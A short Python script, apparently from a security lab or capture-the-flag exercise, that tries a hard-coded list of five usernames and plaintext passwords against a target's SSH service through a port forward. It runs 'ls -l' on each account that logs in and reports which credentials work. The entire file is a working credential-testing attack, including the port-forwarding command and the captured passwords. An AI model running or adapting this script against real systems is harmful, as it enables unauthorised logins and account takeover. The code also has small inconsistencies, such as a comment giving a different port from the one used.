import requests
from paramiko import SSHClient
from paramiko.ssh_exception import AuthenticationException


# Need access to the SSH port of the target. The following forwards the port to localhost:8082
# ssh -L 8083:192.168.122.118:22 jonash22@vulcan.hir.is
WILBUR_SSH_HOST = "localhost"
WILBUR_SSH_PORT = "8083"


KNOWN_USERS =     users = [
        {
            "user": "wilburwhateley",
            "pass": "+yog_sototh"
        },
        {
            "user": "lavinia",
            "pass": "Ad9XPzFTEf"
        },
        {
            "user": "herbwest",
            "pass": "bodies_just,so_many_bodies!"
        },
        {
            "user": "pickmann",
            "pass": "MyS3cr3t1sThatIUs3Phot0References"
        },
        {
            "user": "moncada",
            "pass": "dingdong"
        },
    ]

def main():
    for user in KNOWN_USERS:
        client = SSHClient()
        client.load_system_host_keys()
        try:
            client.connect(hostname=WILBUR_SSH_HOST, port=WILBUR_SSH_PORT, username=user["user"], password=user["pass"])
            stdin, stdout, stderr = client.exec_command('ls -l')
            print("✅ Logged in as user " + user["user"])
        except AuthenticationException as e:
            print("❌ Could not login as user " + user["user"])





if __name__=="__main__":
    main()